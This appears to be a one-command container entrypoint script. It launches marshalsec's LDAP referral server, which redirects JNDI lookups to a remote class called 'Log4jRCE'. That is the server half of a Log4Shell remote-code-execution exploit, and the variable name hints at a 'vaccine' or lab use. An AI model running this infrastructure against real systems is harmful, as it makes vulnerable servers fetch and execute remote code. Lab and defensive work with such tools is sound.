#! /bin/bash
cd /ldapserver/target
#tail -f /dev/null
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://${VACCINE_URL}:8000/#Log4jRCE"